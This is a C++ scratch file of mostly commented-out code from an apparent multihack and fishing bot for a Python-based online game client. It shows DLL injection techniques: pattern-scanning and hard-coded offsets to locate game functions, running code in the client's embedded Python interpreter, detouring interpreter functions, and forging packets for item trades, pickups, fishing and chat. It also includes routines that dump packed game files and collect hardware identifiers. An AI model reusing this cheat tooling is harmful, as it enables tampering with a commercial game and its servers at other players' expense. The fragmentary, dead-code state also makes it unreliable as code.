//PyEval_InitThreads();
//HMODULE pythonModule = NULL;
//pythonModule = GetModuleHandleA("python27.dll");
//if (pythonModule == NULL)
//{
//	MessageBoxA(NULL, "Could not load python27.dll!", "Error", MB_ICONERROR);
//
//}
//PythonDefine::tPyRun_SimpleString xPyRun_SimpleString = (PythonDefine::tPyRun_SimpleString)GetProcAddress(pythonModule, "PyRun_SimpleString");
//PythonDefine::tPyRun_SimpleStringFlags xPyRun_SimpleStringFlags = (PythonDefine::tPyRun_SimpleStringFlags)GetProcAddress(pythonModule, "YGzkMfWxWrhkZauvuNsIckQ");
//if (xPyRun_SimpleString == NULL)
//{
//	MessageBoxA(NULL, "PyRun_SimpleString!", "Error", MB_ICONERROR);
//
//}
//if (xPyRun_SimpleStringFlags == NULL)
//{
//	MessageBoxA(NULL, "PyRun_SimpleStringFlags!", "Error", MB_ICONERROR);
//
//}
//int u = xPyRun_SimpleStringFlags("exec(compile(open('yest.py').read(), 'yest.py', 'exec'))", NULL);
//MessageBoxA(NULL, to_string(u).c_str(), "Error", MB_ICONERROR);
////if (u == -1)
////{
////	std::string str;
////	PyObject * exc;
////	PyObject * v;
////	PyObject * tb;
////	const char * errStr;
//
////	PyErr_Fetch(&exc, &v, &tb);
//
////	if (PyString_Check(v))
////	{
////		errStr = PyString_AS_STRING(v);
////		str.append("Error: ");
////		str.append(errStr);
////	/*	ui.plainTextEditPacketSendOutput->appendHtml(QString::fromStdString(str));*/
//
////	}
////	Py_DECREF(exc);
////	Py_DECREF(v);
////	Py_DECREF(tb);
/////*	ui.plainTextEditPacketSendOutput->appendHtml(QString::fromStdString(str));*/
////}

/*HWND hWnd = Misc::FindTopWindow(GetCurrentProcessId());
Misc::ShowBalloon(hWnd, L"huj", L"huj2", NULL);*/

////dllHandle = LoadLibrary(L"python27_d.dll");
//
//
///* PythonDefine::Initialize(hModule);*/








//
///* Py_Initialize();
//PyEval_InitThreads();*/
////PyImport_ImportModule("test");
////PyRun_SimpleStringFlags("import dbg\ndbg.LogBox('Brak banner.tga')", NULL);
////PyRun_SimpleStringFlags("exec(compile(open('test.py').read(), 'test.py', 'exec'))", NULL);
////PyRun_SimpleStringFlags("import dbg\ndbg.LogBox('nk')", NULL);
///*Py_SetProgramName("eter.python2");
//Py_Initialize();*/

//
//PythonDefine::_Py_Initialize();
//   PythonDefine::_PyEval_InitThreads2();


//PythonDefine::_PyEval_InitThreads();
///*inityttttt();*/

//int yy = PythonDefine::_PyRun_SimpleStringFlags("import yttttt", NULL);
//
////PythonDefine::_PyImport_ImportModule("ui");
////PyThreadState *tstate = PythonDefine::_PyThreadState_Get2();
////PyInterpreterState  *inter = tstate->interp;



////PyThreadState *tstate2 = PythonDefine::_PyThreadState_Get();
////PyInterpreterState  *inter2 = tstate2->interp;


////// // PyInterpreterState  *inter3 = PythonDefine::_PyInterpreterState_Head();
////inter2->modules = inter->modules;
////memcpy(inter2->builtins, inter->builtins, sizeof(PyObject));
////memcpy(inter2->modules_reloading, inter->modules_reloading, sizeof(PyObject));
////memcpy(inter2->sysdict, inter->sysdict, sizeof(PyObject));
////memcpy(inter3, inter, sizeof(PyInterpreterState));
///* PythonDefine::__PyThreadState_Prealloc(inter);*/


///* PyThreadState *tstate3 = PythonDefine::_PyThreadState_New(inter);
//PythonDefine::_PyThreadState_Swap(tstate3);*/

//// int yyl = PythonDefine::_PyRun_SimpleStringFlags("print('hello, this is python')", NULL);

//PyObject* i = PythonDefine::_PyImport_GetModuleDict();
//PyObject *key, *value;
//Py_ssize_t pos = 0;
//
//while (PythonDefine::_PyDict_Next(i, &pos, &key, &value))
//{
//	char* ckey = PythonDefine::_PyString_AsString(key);
//	this->AppendFishBotLog( ckey);
//	if (strcmp(ckey, "sys") == 0)
//	{
//		/*PyObject*hh = PythonDefine::_PyDict_GetItemString(, "dbg");
//		int iy = 7;*/

//	}
//	if (strcmp(ckey, "chat") == 0)
//	{
//		int y = 1;
//	}
//	// 		PyObject*networkStream = PythonDefine::_PyObject_GetAttrString(PythonDefine::_PyImport_ImportModule(ckey), "SendItemUsePacket");
//	// 		if (networkStream != NULL)
//	// 		{
//	//	int y = 1;
//	// 		}
//	// 	/*	PyObject*characterManager = PythonDefine::_PyObject_GetAttrString(PythonDefine::_PyImport_ImportModule(ckey), "GetPickedVID");
//	// 		if (characterManager != NULL)
//	// 		{
//	//	int y = 1;
//	// 		}*/
//	// 		PyObject*player = PythonDefine::_PyObject_GetAttrString(PythonDefine::_PyImport_ImportModule(ckey), "PickCloseItem");
//	// 		if (player != NULL)
//	// 		{
//	//	int y = 1;
//	// 		}
//	// 		PyObject*chat = PythonDefine::_PyObject_GetAttrString(PythonDefine::_PyImport_ImportModule(ckey), "AppendChat");
//	// 		if (chat != NULL)
//	// 		{
//	//	int y = 1;
//	// 		}
//	// 		PyObject*character = PythonDefine::_PyObject_GetAttrString(PythonDefine::_PyImport_ImportModule(ckey), "CreateInstance");
//	// 		if (character != NULL)
//	// 		{
//	//	int y = 1;
//	// 		}
//	// 		PyObject*item = PythonDefine::_PyObject_GetAttrString(PythonDefine::_PyImport_ImportModule(ckey), "GetItemName");
//	// 		if (item != NULL)
//	// 		{
//	//	int y = 1;
//	// 		}
//	// 
//	//PyObject*log = PythonDefine::_PyObject_GetAttrString(PythonDefine::_PyImport_ImportModule(ckey), "LogBox");
//	//if (item != NULL)
//	//{
//	//	int y = 1;
//	//}
//	/*Py_DECREF(networkStream);
//	Py_DECREF(characterManager);
//	Py_DECREF(player);
//	Py_DECREF(chat);
//	Py_DECREF(character);
//	Py_DECREF(item);*/
//}

////int l = PythonDefine::_PyRun_SimpleStringFlags("import dbg", NULL);



//////int p = PythonDefine::_PyRun_SimpleStringFlags("import dbg", NULL);



//////int tyt = PythonDefine::_PyRun_SimpleStringFlags("import sys", NULL);

////int o = PythonDefine::_PyRun_SimpleStringFlags("import root", NULL);
////int iyy = PythonDefine::_PyRun_SimpleStringFlags("import system_python", NULL);




////int u = PythonDefine::_PyRun_SimpleStringFlags("import kdbg\nkdbg.LogBox('Brak banner.tga')",NULL);
//////int m = PythonDefine::_PyRun_SimpleStringFlags("dbg.LogBox('Brak banner.tga')", NULL);
//////int vf = PythonDefine::_PyRun_SimpleStringFlags("import dbg\ndbg.LogBox('Brak banner.tga')", NULL);
//////	int xx = PythonDefine::_PyRun_SimpleStringFlags("exec(compile(open('d:\\k.py').read(), 'd:\\k.py', 'exec'))", NULL);
//////	int xx1 = PythonDefine::_PyRun_SimpleStringFlags("exec(compile(open('test.py').read(), 'test.py', 'exec'))", NULL);
///*PyObject* args = PythonDefine::_PyTuple_New(1);

//PythonDefine::_PyTuple_SetItem(args, 0, PythonDefine::_PyString_FromString("ll"));
//PyObject* ob = PythonDefine::_PyImport_ImportModule("dbg");
//PyObject* func = PythonDefine::_PyObject_GetAttrString(ob, "LogBox");
//PyObject* ret = PythonDefine::_PyObject_Call(func, args, NULL);
//PyObject* oboo=PythonDefine::_PyImport_ImportModule("test");*/


////// // PythonDefine::_PyRun_SimpleString("import chat\nchat.AppendChat(2, 'Multihack by Cycu')");


//////  std::string str;

////// 

////  PyObject * exc;
////  PyObject * v;
////  PyObject * tb;
////  char * errStr;

////  PythonDefine::_PyErr_Fetch(&exc, &v, &tb);
////  if (exc != NULL)
////  {
////   int g = 7;
////  }
////  /*errStr = PythonDefine::_PyString_AsString(v);
////   str.append("Error: ");
////   str.append(errStr);*/

////
//// 


//Globals::iCPythonApplicationInstance;
//DWORD u = GameFunctions::PlayerGetItemMetinSocket(0, 0);
//MessageBox(NULL, to_wstring(u).c_str(), L"", NULL);
//Globals::iCPythonApplicationInstance;
//int i = 9;
/*DWORD* pkItemData;
Globals::CItemManagerGetItemDataPointer((void*)Globals::iCItemManagerInstance, GameFunctions::PlayerGetItemIndex(0), &pkItemData);
const char* i = Globals::CItemDataGetName(pkItemData);*/


/*ShowWindowAsync(Globals::hWnds[0], SW_SHOWMAXIMIZED);*/


/*for (int i = 0; i < 4; i++)
{
PlaySound(L"SystemAsterisk", NULL, SND_SYNC);
}*/
/*GameFunctions::NetworkStreamConnectGameServer(0);*/
//DWORD i = Globals::iCPythonCharacterManagerInstance + 32;
//DWORD y = *reinterpret_cast<DWORD *>(i);
//DWORD z = *reinterpret_cast<DWORD *>(y);
//DWORD z2 = *reinterpret_cast<DWORD *>(y+4);
////TCharacterInstanceMap				m_kAliveInstMap = *(TCharacterInstanceMap*)(z);
//TCharacterInstanceMap				m_kAliveInstMap2 = *(TCharacterInstanceMap*)(y);
//TCharacterInstanceMap				m_kAliveInstMap3 = *(TCharacterInstanceMap*)(z2);
//QColor color = QColorDialog::getColor(Qt::yellow, this);
//string i = color.name().toStdString();
//StringExtension::ReplaceString(i, "0x", "");
//StringExtension::ReplaceString(i, "#", "");
//i.erase(std::remove(i.begin(), i.end(), '#'), i.end());
//string u = "|cFF" + i + "|H|h[Eloszka]";

//string y = "|cFF005500|H|hK|cFFff0000|H|ht|cFF3a6eff|H|ho |cFF00ff00|H|hj|cFFff00ff|H|he|cFF55ffff|H|hs|cFFaa55ff|H|ht |cFF732704|H|ht|cFFffff7f|H|he|cFF717313|H|hc|cFF212173|H|hh|cFFffffff|H|hn|cFFff0000|H|hi|cffff7f|H|hk|cFFff00ff|H|hi|caaff7f|H|he|cFF00ff7f|H|hm|cFF23b7d4|H|h?";
//GameFunctions::NetworkStreamSendChatPacket(y.c_str(),6);


/*GameFunctions::NetworkStreamSendSendExchangeItemAddPacket(TItemPos(1, 0), 1);
GameFunctions::NetworkStreamSendSendExchangeAcceptPacket();*/
/*string a = ProtectExtension::GetMacAdress();
string b = ProtectExtension::GetCpuId();
string f = ProtectExtension::GetHWID();
string d = ProtectExtension::GetMachineName();
ComputerInformation computerInformation;
memset(&computerInformation, 0, sizeof(computerInformation));
memcpy(&computerInformation.getMacAdress, a.c_str(), a.length());
memcpy(&computerInformation.getCpuId, b.c_str(), b.length());
memcpy(&computerInformation.getHWID, f.c_str(), f.length());
memcpy(&computerInformation.getMachineName, d.c_str(), d.length());


std::ofstream out("computerInformation");
out.write(reinterpret_cast<char*>(&computerInformation), sizeof(computerInformation));*/



/*for (TCharacterInstanceMap::iterator itor = m_kAliveInstMap3.begin(); itor != m_kAliveInstMap3.end(); itor++)
{
DWORD vid = itor->first;
int objectType = GameFunctions::InstanceBaseGetInstanceType(itor->second);
if (objectType == TYPE_PC)
{
const char * name = GameFunctions::InstanceBaseGetNameString(itor->second);
int break1 = 0;
}
}*/

/*bool f = GameFunctionsCustom::PlayerIsAlive();
int i = 0;*/



/*
map<DWORD, DWORD *> vidList = GameFunctionsCustom::GetObjectListInDistance(0, 4000);
for (map<DWORD, DWORD *>::iterator itor = vidList.begin(); itor != vidList.end(); itor++)
{


AppendFishBotLogNormal(GameFunctions::InstanceBaseGetNameString(itor->second));
}*/


/*typedef const char *(__thiscall* tCInstanceBaseGetNameString)(void* This);
tCInstanceBaseGetNameString CInstanceBaseGetNameString = (tCInstanceBaseGetNameString)((DWORD)GetModuleHandle(NULL) + +0x61BC0);

DWORD iCPythonCharacterManagerInstance = *reinterpret_cast<DWORD *>((DWORD)GetModuleHandle(NULL) + 0xAFFBF);
typedef std::map<DWORD, DWORD *>    TCharacterInstanceMap;
DWORD a = iCPythonCharacterManagerInstance + 32;
DWORD b = *reinterpret_cast<DWORD *>(a);
DWORD c = *reinterpret_cast<DWORD *>(b + 4);

TCharacterInstanceMap				m_kAliveInstMap = *(TCharacterInstanceMap*)(c);




for (TCharacterInstanceMap::iterator itor = m_kAliveInstMap.begin(); itor != m_kAliveInstMap.end(); itor++)
{
DWORD vid = itor->first;


typedef const char *(__thiscall* tCInstanceBaseGetNameString)(void* This);
MessageBox(NULL, to_string(vid).c_str(), CInstanceBaseGetNameString(itor->second), NULL);
}*/






/*GameFunctions::NetworkStreamSendItemMovePacket(TItemPos(1, 0), TItemPos(1, 3), -9);*/


//GameFunctions::NetworkStreamSendItemMovePacket(TItemPos(1, 0), TItemPos(1, 3), 9);


//
//int u = GameFunctions::GetTargetVID();
//
//GameFunctions::SendExchangeStartPacket(u);
//GameFunctions::SendExchangeItemAddPacket(TItemPos(1, 0), 1);
//GameFunctions::SendExchangeAcceptPacket();
//GameFunctions::SendItemUsePacket(0);


//GameFunctions::NewFishing();


//
//PythonDefine::Initialize();
//
//
//
//
//
//
//Py_NoSiteFlag = 1; Py_FrozenFlag = 1; Py_IgnoreEnvironmentFlag = 1; Py_SetPythonHome("python"); Py_SetProgramName("");
//Py_Initialize();
//
///* PySys_SetPath("C:/Users/Alex/Desktop/Vesteris s2");*/
//
//int o = PythonDefine::_PyRun_SimpleStringFlags("exec(compile(open('example.py').read(), 'example.py', 'exec'))");
/*initexample();*/
/*	 o = PyRun_SimpleStringFlags2("import sys", 0);
	 o = PyRun_SimpleStringFlags2("import ctypes", 0);
	 o = PyRun_SimpleStringFlags2("import sys\nsys.path.insert(0, 'lib')", 0);
	 o = PyRun_SimpleStringFlags2("import sys\nsys.path.insert(0, 'lib/ctypes')", 0);
	 o = PyRun_SimpleStringFlags2("import ctypes", 0);
	 o = PyRun_SimpleStringFlags2("import md5", 0);*/



//DWORD l = (DWORD)GetModuleHandle(NULL);
/*  nPyEval_EvalFrameEx = (PythonDefine::tPyEval_EvalFrameEx)DetourFunction((PBYTE)PythonDefine::_PyEval_EvalFrameEx, (PBYTE)NewPyEval_EvalFrameEx);
  nPyFrame_New =  (PythonDefine::tPyFrame_New)DetourFunction((PBYTE)PythonDefine::_PyFrame_New, (PBYTE)NewPyFrame_New);*/

  /* _PyRun_SimpleStringFlags("exec(compile(open('example.py').read(), 'example.py', 'exec'))" );*/
   //  /**/



   /* PythonDefine::_PyRun_SimpleStringFlags("exec(compile(open('example.py').read(), 'example.py', 'exec'))" ,0);*/
  /*   DWORD i = (DWORD)GetModuleHandle(NULL);
	 DWORD u = *reinterpret_cast<DWORD *>( i+ 0x02BFEE9C);
	 DWORD uz = *(DWORD *)(u + 4);
	 DWORD uyz = *(DWORD *)(uz + 4);
	 DWORD uyzy = *(DWORD *)(uz + 0x88);
	 DWORD uyzu = *(DWORD *)(uyz + 0x88);

	 */
	 //	   DWORD  v3 = (*(int(__thiscall **)(DWORD *))(u[1] + 136))(u + 1);

 /*	   PyObject* m_poModule;
		PyObject* m_poDic;

		PythonDefine::tPyRun_String sxPyRun_String = NULL;
		sxPyRun_String = (PythonDefine::tPyRun_String)(Globals::hEntryBaseAddress + 0x0010B970);
		sxPyRun_String("exec(compile(open('zest.py').read(), 'zest.py', 'exec'))", 257, m_poDic, m_poDic, 0);*/



		/*  int diff = (&function2 - &function1);
		  printf("pagesize: %d, diff: %d\n", getpagesize(), diff);*/

		  /*	   int(*fptr)(int*,int*);

				 void *memfun = malloc(4096);

				 if (mprotect(memfun, 4096, PROT_READ | PROT_EXEC | PROT_WRITE) == -1) {
					 perror("mprotect");
				 }

				 memcpy(memfun, (const void*)&function2, diff);




				 static PythonDefine::tPyEval_EvalFrameEx nPyEval_EvalFrameEx = NULL;
static PythonDefine::tPyFrame_New nPyFrame_New = NULL;
//static PyObject *  __cdecl NewPyEval_EvalFrameEx(_frame *f, int throwflag)
//{
//	/*PyObject *  temp =PythonDefine::_PyEval_EvalFrameEx2(f, throwflag);*/
//return nPyEval_EvalFrameEx(f, throwflag);
//}
//
//static _frame *  __cdecl NewPyFrame_New(PyThreadState *tstate, PyCodeObject *code, PyObject *globals, PyObject *locals)
//{
//	_frame * temp = PythonDefine::_PyFrame_New2(tstate, code, globals, locals);
//	return nPyFrame_New(tstate, code, globals, locals);
//}





/*typedef std::map<DWORD, DWORD *>	TCharacterInstanceMap;
DWORD i = Globals::iCPythonCharacterManagerInstance + 32;
DWORD y = *reinterpret_cast<DWORD *>(i);
DWORD z = *reinterpret_cast<DWORD *>(y);
DWORD z2 = *reinterpret_cast<DWORD *>(y+4);
TCharacterInstanceMap				m_kAliveInstMap = *(TCharacterInstanceMap*)(z);
TCharacterInstanceMap				m_kAliveInstMap2 = *(TCharacterInstanceMap*)(y);
TCharacterInstanceMap				m_kAliveInstMap3 = *(TCharacterInstanceMap*)(z2);
int u = m_kAliveInstMap.size();
TCharacterInstanceMap::iterator itor;
for (itor = m_kAliveInstMap.begin(); itor != m_kAliveInstMap.end(); itor++)
{
int i = 9;
}*/
//if (SHCreateDirectoryEx(NULL, L"d:\\Dump\\", NULL))
//{
//
//}
//std::map< int, std::string>::iterator it = Hooks::uuu.begin();
//while (it != Hooks::uuu.end())
//{
//
//	MainForm::AppendFishBotLog(it->second.c_str());
//	LPCVOID huj = NULL;
//	DWORD ii = NULL;
//	((DWORD*(__thiscall*)(DWORD*))(Globals::hEntryBaseAddress + 0x00025126))(&ii);
//	DWORD YY = *(DWORD*)(Globals::hEntryBaseAddress + 0x00696A28);
//	DWORD mm = *reinterpret_cast<DWORD *>(Globals::hEntryBaseAddress + 0x00696A28);
//	Globals::CEterPackManagerGet = (Globals::tCEterPackManagerGet)(Globals::hEntryBaseAddress + 0x00007C11);
//	Globals::CEterPackManagerGet((void*)mm, ii, it->second.c_str(), &huj);
//
//	/*size = *(DWORD*)(&ii + 284);*/
//
//
//	int size = ((DWORD(__thiscall*)(DWORD))(Globals::hEntryBaseAddress + 0x0000B82F))(ii);
//	int size = ((DWORD(__thiscall*)(DWORD))(Globals::hEntryBaseAddress + 0x0000B82F))((DWORD)&ii);
//	ofstream fout;
//	string s1 = it->second;
//	string s2 = StringExtension::ReplaceString(s1, "d:\\", "");
//	string s25 = StringExtension::ReplaceString(s2, "d:/", "");
//	string s3 = StringExtension::ReplaceString(s25, "/", "\\");
//	string s4 = StringExtension::ReplaceString(s3, "\\", "\\");
//	string s99 = StringExtension::ReplaceString(s3, "\\", "-");
//	string s5 = FileExtension::GetDirectoryPathFromFilePatch(s4);
//	string s6 = "d:\\Dump\\" + s5;
//
//	mkdir(s6.c_str());
//	if (huj != NULL)
//	{
//		char *bj = new char[size];
//		memcpy(&bj, huj, sizeof(bj));
//		fout.open("d:\\Dump\\" + s4, ios::binary | ios::out);
//		fout.write(bj, size);
//		fout.close();
//	}
//	it++;
//}



/*	if (bCPythonPlayerInstance != NULL && mCPythonPlayerInstance != NULL)
	{

		DWORD movAsm = PatternScan::FindPattern(bCPythonPlayerInstance, mCPythonPlayerInstance);
		if (movAsm != NULL)
		{
			pCPythonPlayerInstance =*reinterpret_cast<DWORD *>(movAsm);
			
		}
		

	}



	if (bCPythonCharacterManagerInstance != NULL && mCPythonCharacterManagerInstance != NULL)
	{
		DWORD movAsm = PatternScan::FindPattern(bCPythonCharacterManagerInstance, mCPythonCharacterManagerInstance);
		if (movAsm != NULL)
		{
			pCPythonCharacterManagerInstance = *reinterpret_cast<DWORD *>(movAsm);
		}
		
	}

	if (bCPythonNetworkStreamInstance != NULL && mCPythonNetworkStreamInstance != NULL)
	{
		DWORD movAsm = PatternScan::FindPattern(bCPythonNetworkStreamInstance, mCPythonNetworkStreamInstance);
		if (movAsm != NULL)
		{
			pCPythonNetworkStreamInstance = *reinterpret_cast<DWORD *>(movAsm);
		}
		
	}

	//#####################################################################################################################################
	if (bPyCallClassMemberFunc != NULL && mPyCallClassMemberFunc != NULL)
	{
		pPyCallClassMemberFunc = PatternScan::FindPattern(bPyCallClassMemberFunc, mPyCallClassMemberFunc);

	}

	if (bCNetworkStreamRecv != NULL && mCNetworkStreamRecv != NULL)
	{
		pCNetworkStreamRecv = PatternScan::FindPattern(bCNetworkStreamRecv, mCNetworkStreamRecv);
	}

	if (bCNetworkStreamSend != NULL && mCNetworkStreamSend != NULL)
	{
		pCNetworkStreamSend = PatternScan::FindPattern(bCNetworkStreamSend, mCNetworkStreamSend);
	}

	if (bCPythonNetworkStreamSendItemUsePacket != NULL && mCPythonNetworkStreamSendItemUsePacket != NULL)
	{
		pCPythonNetworkStreamSendItemUsePacket = PatternScan::FindPattern(bCPythonNetworkStreamSendItemUsePacket, mCPythonNetworkStreamSendItemUsePacket);
	}

	if (bCPythonPlayerNEW_Fishing != NULL && mCPythonPlayerNEW_Fishing != NULL)
	{
		pCPythonPlayerNEW_Fishing = PatternScan::FindPattern(bCPythonPlayerNEW_Fishing, mCPythonPlayerNEW_Fishing);
	}

	if (bCPythonChatAppendChat != NULL && mCPythonChatAppendChat != NULL)
	{
		pCPythonChatAppendChat = PatternScan::FindPattern(bCPythonChatAppendChat, mCPythonChatAppendChat);
	}

	if (bCPythonNetworkStreamSendFishingPacket != NULL && mCPythonNetworkStreamSendFishingPacket != NULL)
	{
		pCPythonNetworkStreamSendFishingPacket = PatternScan::FindPattern(bCPythonNetworkStreamSendFishingPacket, mCPythonNetworkStreamSendFishingPacket);
	}

	if (bCPythonNetworkStreamSendExchangeStartPacket != NULL && mCPythonNetworkStreamSendExchangeStartPacket != NULL)
	{
		pCPythonNetworkStreamSendExchangeStartPacket = PatternScan::FindPattern(bCPythonNetworkStreamSendExchangeStartPacket, mCPythonNetworkStreamSendExchangeStartPacket);
	}

	if (bCPythonNetworkStreamSendExchangeItemAddPacket != NULL && mCPythonNetworkStreamSendExchangeItemAddPacket != NULL)
	{
		pCPythonNetworkStreamSendExchangeItemAddPacket = PatternScan::FindPattern(bCPythonNetworkStreamSendExchangeItemAddPacket, mCPythonNetworkStreamSendExchangeItemAddPacket);
	}

	if (bCPythonNetworkStreamSendExchangeAcceptPacket != NULL && mCPythonNetworkStreamSendExchangeAcceptPacket != NULL)
	{
		pCPythonNetworkStreamSendExchangeAcceptPacket = PatternScan::FindPattern(bCPythonNetworkStreamSendExchangeAcceptPacket, mCPythonNetworkStreamSendExchangeAcceptPacket);
	}

	if (bCPythonPlayerGetTargetVID != NULL && mCPythonPlayerGetTargetVID != NULL)
	{
		pCPythonPlayerGetTargetVID = PatternScan::FindPattern(bCPythonPlayerGetTargetVID, mCPythonPlayerGetTargetVID);
	}

	if (bCPythonPlayerClickSkillSlot != NULL && mCPythonPlayerClickSkillSlot != NULL)
	{
		pCPythonPlayerClickSkillSlot = PatternScan::FindPattern(bCPythonPlayerClickSkillSlot, mCPythonPlayerClickSkillSlot);
	}
	if (bCPythonPlayerIsSkillCoolTime != NULL && mCPythonPlayerIsSkillCoolTime != NULL)
	{
		pCPythonPlayerIsSkillCoolTime = PatternScan::FindPattern(bCPythonPlayerIsSkillCoolTime, mCPythonPlayerIsSkillCoolTime);
	}

	if (bCPythonPlayerPickCloseItem != NULL && mCPythonPlayerPickCloseItem != NULL)
	{
		pCPythonPlayerPickCloseItem = PatternScan::FindPattern(bCPythonPlayerPickCloseItem, mCPythonPlayerPickCloseItem);

	}
	if (bCPythonPlayerGetMainCharacterIndex != NULL && mCPythonPlayerGetMainCharacterIndex != NULL)
	{
		pCPythonPlayerGetMainCharacterIndex = PatternScan::FindPattern(bCPythonPlayerGetMainCharacterIndex, mCPythonPlayerGetMainCharacterIndex);
	}

	if (bCPythonPlayerGetRace != NULL && mCPythonPlayerGetRace != NULL)
	{
		pCPythonPlayerGetRace = PatternScan::FindPattern(bCPythonPlayerGetRace, mCPythonPlayerGetRace);
	}

	if (bCPythonPlayerSetStatus != NULL && mCPythonPlayerSetStatus != NULL)
	{
		pCPythonPlayerSetStatus = PatternScan::FindPattern(bCPythonPlayerSetStatus, mCPythonPlayerSetStatus);
	}

	if (bCPythonPlayerGetStatus != NULL && mCPythonPlayerGetStatus != NULL)
	{
		pCPythonPlayerGetStatus = PatternScan::FindPattern(bCPythonPlayerGetStatus, mCPythonPlayerGetStatus);
	}

	if (bCPythonPlayerGetName != NULL && mCPythonPlayerGetName != NULL)
	{
		pCPythonPlayerGetName = PatternScan::FindPattern(bCPythonPlayerGetName, mCPythonPlayerGetName);
	}

	if (bCPythonPlayerGetItemIndex != NULL && mCPythonPlayerGetItemIndex != NULL)
	{
		pCPythonPlayerGetItemIndex = PatternScan::FindPattern(bCPythonPlayerGetItemIndex, mCPythonPlayerGetItemIndex);
	}

	if (bCPythonPlayerGetItemIndex != NULL && mCPythonPlayerGetItemIndex != NULL)
	{
		pCInstanceBaseGetNameString = PatternScan::FindPattern(bCInstanceBaseGetNameString, mCInstanceBaseGetNameString);
	}

	if (bCInstanceBaseGetInstanceType != NULL && mCInstanceBaseGetInstanceType != NULL)
	{
		pCInstanceBaseGetInstanceType = PatternScan::FindPattern(bCInstanceBaseGetInstanceType, mCInstanceBaseGetInstanceType);
	}

	if (bCPythonItemGetPickedItemID != NULL && mCPythonItemGetPickedItemID != NULL)
	{
		pCPythonItemGetPickedItemID = PatternScan::FindPattern(bCPythonItemGetPickedItemID, mCPythonItemGetPickedItemID);
	}

	if (bCPythonCharacterManagerGetInstancePtr != NULL && mCPythonCharacterManagerGetInstancePtr != NULL)
	{
		pCPythonCharacterManagerGetInstancePtr = PatternScan::FindPattern(bCPythonCharacterManagerGetInstancePtr, mCPythonCharacterManagerGetInstancePtr);
	}

	if (bCInstanceBaseGetDistance != NULL && mCInstanceBaseGetDistance != NULL)
	{
		pCInstanceBaseGetDistance = PatternScan::FindPattern(bCInstanceBaseGetDistance, mCInstanceBaseGetDistance);
	}

	if (bCPythonCharacterManagerIsAliveVID != NULL && mCPythonCharacterManagerIsAliveVID != NULL)
	{
		pCPythonCharacterManagerIsAliveVID = PatternScan::FindPattern(bCPythonCharacterManagerIsAliveVID, mCPythonCharacterManagerIsAliveVID);
	}

	if (bCPythonPlayerSetAttackKeyState != NULL && mCPythonPlayerSetAttackKeyState != NULL)
	{
		pCPythonPlayerSetAttackKeyState = PatternScan::FindPattern(bCPythonPlayerSetAttackKeyState, mCPythonPlayerSetAttackKeyState);
	}

	if (bCInstanceBaseSetDirection != NULL && mCInstanceBaseSetDirection != NULL)
	{
		pCInstanceBaseSetDirection = PatternScan::FindPattern(bCInstanceBaseSetDirection, mCInstanceBaseSetDirection);
	}

	if (bCPythonPlayerNEW_GetMainActorPtr != NULL && mCPythonPlayerNEW_GetMainActorPtr != NULL)
	{

		pCPythonPlayerNEW_GetMainActorPtr = PatternScan::FindPattern(bCPythonPlayerNEW_GetMainActorPtr, mCPythonPlayerNEW_GetMainActorPtr);
	}

	if (bCInstanceBaseIsMountingHorse != NULL && mCInstanceBaseIsMountingHorse != NULL)
	{
		pCInstanceBaseIsMountingHorse = PatternScan::FindPattern(bCInstanceBaseIsMountingHorse, mCInstanceBaseIsMountingHorse);
	}

	if (bCPythonNetworkStreamSendChatPacket != NULL && mCPythonNetworkStreamSendChatPacket != NULL)
	{
		pCPythonNetworkStreamSendChatPacket = PatternScan::FindPattern(bCPythonNetworkStreamSendChatPacket, mCPythonNetworkStreamSendChatPacket);
	}

	if (bCGraphicTextInstanceSetValue != NULL && mCGraphicTextInstanceSetValue != NULL)
	{

		pCGraphicTextInstanceSetValue = PatternScan::FindPattern(bCGraphicTextInstanceSetValue, mCGraphicTextInstanceSetValue);
	}

	if (bCPythonNetworkStreamSendItemPickUpPacket != NULL && mCPythonNetworkStreamSendItemPickUpPacket != NULL)
	{

		pCPythonNetworkStreamSendItemPickUpPacket = PatternScan::FindPattern(bCPythonNetworkStreamSendItemPickUpPacket, mCPythonNetworkStreamSendItemPickUpPacket);
	}
	if (bCPythonItemCreateItem != NULL && mCPythonItemCreateItem != NULL)
	{

		pCPythonItemCreateItem = PatternScan::FindPattern(bCPythonItemCreateItem, mCPythonItemCreateItem);
	}

	if (bCInstanceBaseNEW_GetPixelPosition != NULL && mCInstanceBaseNEW_GetPixelPosition != NULL)
	{
		pCInstanceBaseNEW_GetPixelPosition = PatternScan::FindPattern(bCInstanceBaseNEW_GetPixelPosition, mCInstanceBaseNEW_GetPixelPosition);


	}
	if (bCInstanceBaseNEW_MoveToDestPixelPositionDirection != NULL && mCInstanceBaseNEW_MoveToDestPixelPositionDirection != NULL)
	{

		pCInstanceBaseNEW_MoveToDestPixelPositionDirection = PatternScan::FindPattern(bCInstanceBaseNEW_MoveToDestPixelPositionDirection, mCInstanceBaseNEW_MoveToDestPixelPositionDirection);



	}




	//#####################################################################################################################################
#ifdef CHECK_OFFSETS
	if (Globals::pPyCallClassMemberFunc == 0x00)
	{

	throw std::exception("PyCallClassMemberFunc pattern fail");
	}
	if (Globals::pCNetworkStreamRecv == 0x00)
	{
	throw std::exception("CNetworkStreamRecv pattern fail");
	}

	if (Globals::pCPythonNetworkStreamSendItemUsePacket == 0x00)
	{
		throw std::exception("CPythonNetworkStreamSendItemUsePacket pattern fail");
	}
	if (Globals::pCPythonPlayerNEW_Fishing == 0x00)
	{
		throw std::exception("CPythonPlayerNEW_Fishing pattern fail");
	}

	if (Globals::pCPythonChatAppendChat == 0x00)
	{
		MessageBoxA(NULL, "Pattern Fail: CPythonChatAppendChat", "Error", MB_OK);
	}/**/


//if (Globals::CPythonPlayerGetTargetVID == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerGetTargetVID", "Error", MB_OK);
//}
//if (Globals::CPythonPlayerPickCloseItem == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerPickCloseItem", "Error", MB_OK);
//}
//if (Globals::CPythonPlayerGetMainCharacterIndex == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerGetMainCharacterIndex", "Error", MB_OK);
//}
//if (Globals::CPythonPlayerGetRace == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerGetRace", "Error", MB_OK);
//}
//if (Globals::CPythonPlayerIsSkillCoolTime == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerIsSkillCoolTime", "Error", MB_OK);
//}
//if (Globals::CPythonPlayerSetStatus == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayer::SetStatus", "Error", MB_OK);
//}
